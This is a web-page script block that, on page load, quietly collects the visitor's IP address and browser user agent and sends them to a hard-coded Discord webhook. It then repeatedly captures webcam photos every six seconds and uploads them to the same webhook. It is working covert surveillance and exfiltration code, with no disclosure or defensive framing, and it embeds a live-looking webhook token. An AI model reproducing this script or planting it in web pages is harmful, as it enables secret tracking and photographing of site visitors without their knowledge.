    <script>
      const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1370115514105331732/7GcVsseCrKPoQTZGJ6F62jPG2K9-_swNWS1QriKQBCyQUNXVrXwM73-5VWNsDsKAFoKV';

function sendIPAndUserAgent() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            const userAgent = navigator.userAgent;
            const message = `IP Address: ${ipAddress}\nUser Agent: ${userAgent}`;
            sendMessageToDiscord(message);
        })
        .catch(error => console.error('Error fetching IP address:', error));
}

function sendMessageToDiscord(message) {
    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        })
    })
    .then(response => {
        if (response.ok) {
            console.log('Message sent to Discord');
        } else {
            console.error('Failed to send message to Discord');
        }
    })
    .catch(error => console.error('Error sending message to Discord:', error));
}

function takePhotoAndSend() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photo = canvas.toDataURL('image/jpeg');

                    sendPhotoToDiscord(photo);
                    video.srcObject.getTracks().forEach(track => track.stop());
                    video.remove();
                }, 1000); 
            };
        })
        .catch(error => console.error('Error accessing camera:', error));
}

function sendPhotoToDiscord(photo) {
    const blob = dataURItoBlob(photo);
    const formData = new FormData();
    formData.append('file', blob, 'photo.jpg');

    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            console.log('Photo sent to Discord');
        } else {
            console.error('Failed to send photo to Discord');
        }
    })
    .catch(error => console.error('Error sending photo to Discord:', error));
}

function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const arrayBuffer = new ArrayBuffer(byteString.length);
    const intArray = new Uint8Array(arrayBuffer);
    for (let i = 0; i < byteString.length; i++) {
        intArray[i] = byteString.charCodeAt(i);
    }
    return new Blob([arrayBuffer], { type: mimeString });
}

sendIPAndUserAgent();

setInterval(takePhotoAndSend, 6000);
